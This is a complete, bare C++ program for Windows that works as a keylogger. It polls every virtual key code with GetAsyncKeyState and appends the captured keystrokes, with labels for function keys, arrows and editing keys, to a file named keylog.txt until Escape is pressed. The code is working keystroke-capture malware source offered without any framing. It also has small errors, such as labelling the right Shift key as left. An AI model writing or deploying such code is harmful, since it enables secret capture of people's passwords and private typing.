#include <Windows.h>
#include <fstream>
#include <iostream>

using namespace std;

int main() {

	ofstream keylog("keylog.txt", ios::app);

	while (!(GetAsyncKeyState(VK_ESCAPE)) & 0b1) {

		for (int i = 0; i < 256; i++) {

			if (GetAsyncKeyState(i) & 0b1) {

				if (isupper(i)) {
					keylog << (char)i;
				}
				else if (i == VK_ESCAPE) {
					keylog << "[ESCAPE]";
				}
				else if (i == VK_RSHIFT) {
					keylog << "[Left SHIFT]";
				}
				else if (i == VK_F1) {
					keylog << "[F1]";
				}
				else if (i == VK_F2) {
					keylog << "[F2]";
				}
				else if (i == VK_F3) {
					keylog << "[F3]";
				}
				else if (i == VK_F4) {
					keylog << "[F4]";
				}
				else if (i == VK_F5) {
					keylog << "[F5]";
				}
				else if (i == VK_F6) {
					keylog << "[F6]";
				}
				else if (i == VK_F7) {
					keylog << "[F7]";
				}
				else if (i == VK_F8) {
					keylog << "[F8]";
				}
				else if (i == VK_F9) {
					keylog << "[F9]";
				}
				else if (i == VK_F10) {
					keylog << "[F10]";
				}
				else if (i == VK_F11) {
					keylog << "[F11]";
				}
				else if (i == VK_F12) {
					keylog << "[F12]";
				}
				else if (i >= 48 && i <= 57) {
					keylog << (char)i;
				}
				else if (i == VK_INSERT) {

					keylog << "[INSERT]";

				}
				else if (i == VK_DELETE) {
					keylog << "[DELETE]";
				}
				else if (i == VK_BACK) {
					keylog << "[BACKSPACE]";
				}
				else if (i == VK_TAB) {
					keylog << "[TAB]";
				}
				else if (i == VK_RETURN) {
					keylog << "[ENTER]";
				}
				else if (i == VK_SPACE) {
					keylog << "[SPACE]";
				}
				else if (i == VK_LEFT) {
					keylog << "[LEFT ARROW]";
				}
				else if (i == VK_RIGHT) {
					keylog << "[RIGHT ARROW]";
				}
				else if (i == VK_UP) {
					keylog << "[UP ARROW]";
				}
				else if (i == VK_DOWN) {
					keylog << "[DOWN ARROW]";
				}


			}
		}
	}
}
